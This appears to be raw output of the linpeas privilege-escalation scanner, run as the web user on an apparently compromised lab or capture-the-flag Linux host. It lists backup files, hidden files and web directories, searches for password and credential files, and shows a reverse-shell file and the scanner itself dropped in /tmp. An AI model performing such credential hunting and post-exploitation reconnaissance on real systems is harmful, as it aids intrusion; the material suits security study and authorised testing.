-rw-r--r-- 1 root root 2500 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 3073 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2018 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 2295 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 755 Apr  7  2016 /usr/share/help-langpack/en_GB/deja-dup/backup-first.page
-rw-r--r-- 1 root root 974 Apr  7  2016 /usr/share/help-langpack/en_GB/deja-dup/backup-auto.page
-rw-r--r-- 1 root root 1291 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 2371 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 1420 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 1720 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-check.page
-rw-r--r-- 1 root root 2503 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 3067 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2020 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 2289 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 2543 Jun 24  2016 /usr/share/help-langpack/en_GB/evolution/backup-restore.page
-rw-r--r-- 1 root root 11280 Dec  4  2017 /usr/share/info/dir.old
-rw-r--r-- 1 root root 0 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/include/config/wm831x/backup.h                                                                                                    
-rw-r--r-- 1 root root 0 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 190058 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/.config.old
-rw-r--r-- 1 root root 31600 Feb  9  2017 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 8710 Jan 18  2017 /lib/modules/4.4.0-62-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8990 Jan 18  2017 /lib/modules/4.4.0-62-generic/kernel/drivers/power/wm831x_backup.ko                                                                                                    

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/mlocate/mlocate.db: regular file, no read permission                                     


╔══════════╣ Web files?(output limit)
/var/www/:                                                                                              
total 12K
drwxr-xr-x  3 root root 4.0K Jun  2  2022 .
drwxr-xr-x 12 root root 4.0K Jun  2  2022 ..
drw-r-xr-x 10 root root 4.0K Jun  2  2022 html

/var/www/html:
total 116K
drw-r-xr-x 10 root root 4.0K Jun  2  2022 .
drwxr-xr-x  3 root root 4.0K Jun  2  2022 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)                                                                                                       
-rw-r--r-- 1 scriptmanager scriptmanager 220 Dec  4  2017 /home/scriptmanager/.bash_logout              
-rw-r--r-- 1 arrexel arrexel 220 Dec  4  2017 /home/arrexel/.bash_logout
-rw-r--r-- 1 root root 0 Dec 13 02:05 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /etc/skel/.bash_logout
-rw------- 1 root root 0 Feb 15  2017 /etc/.pwd.lock
-rw-r--r-- 1 root root 1391 Dec  4  2017 /etc/apparmor.d/cache/.features

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                           
-rw-r--r-- 1 www-data www-data 3458 Dec 13 02:49 /tmp/rev.php                                           
-rw-r--r-- 1 www-data www-data 127032 Dec 13 02:33 /tmp/linpeas.txt
-rwxr-xr-x 1 www-data www-data 3235784 Dec 13 02:27 /tmp/linpeas

╔══════════╣ Searching passwords in history files
                                                                                                        
╔══════════╣ Searching passwords in config PHP files
                                                                                                        
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                               
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/share/help-langpack/en_AU/ubuntu-help/user-changepassword.page
/usr/share/help-langpack/en_AU/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_AU/ubuntu-help/user-goodpassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-changepassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-goodpassword.page
/usr/share/help-langpack/en_GB/evince/password.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-changepassword.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-goodpassword.page
/usr/share/help-langpack/en_GB/zenity/password.page
/usr/share/locale-langpack/en_AU/LC_MESSAGES/credentials-control-center.mo
/usr/share/locale-langpack/en_AU/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/locale-langpack/en_CA/LC_MESSAGES/credentials-control-center.mo
/usr/share/locale-langpack/en_GB/LC_MESSAGES/credentials-control-center.mo
/usr/share/locale-langpack/en_GB/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/man/man1/systemd-ask-password.1.gz
/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
/usr/share/man/man7/credentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                        
╔══════════╣ Searching passwords inside logs (limit 70)
 base-passwd depends on libc6 (>= 2.8); however:                                                        
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
2017-02-15 20:19:39 configure base-passwd:amd64 3.5.39 3.5.39
2017-02-15 20:19:39 install base-passwd:amd64 <none> 3.5.39
2017-02-15 20:19:39 status half-configured base-passwd:amd64 3.5.39
2017-02-15 20:19:39 status half-installed base-passwd:amd64 3.5.39
2017-02-15 20:19:39 status installed base-passwd:amd64 3.5.39
2017-02-15 20:19:39 status unpacked base-passwd:amd64 3.5.39
2017-02-15 20:19:43 status half-configured base-passwd:amd64 3.5.39
2017-02-15 20:19:43 status half-installed base-passwd:amd64 3.5.39
2017-02-15 20:19:43 status unpacked base-passwd:amd64 3.5.39
2017-02-15 20:19:43 upgrade base-passwd:amd64 3.5.39 3.5.39
2017-02-15 20:19:56 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
2017-02-15 20:19:56 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
2017-02-15 20:19:56 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2017-02-15 20:20:12 configure base-passwd:amd64 3.5.39 <none>
2017-02-15 20:20:12 status half-configured base-passwd:amd64 3.5.39
2017-02-15 20:20:12 status unpacked base-passwd:amd64 3.5.39
2017-02-15 20:20:13 status installed base-passwd:amd64 3.5.39
2017-02-15 20:20:26 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
2017-02-15 20:20:26 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
2017-02-15 20:20:26 status installed passwd:amd64 1:4.2-3.1ubuntu5
2017-02-15 20:20:26 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
Description: Set up users and passwords
Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.39) ...
Setting up passwd (1:4.2-3.1ubuntu5) ...
Shadow passwords are now on.
Unpacking base-passwd (3.5.39) ...
Unpacking base-passwd (3.5.39) over (3.5.39) ...
Unpacking passwd (1:4.2-3.1ubuntu5) ...
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                      
                                ╚════════════════╝                                                      
Regexes to search for API keys aren't activated, use param '-r' 


```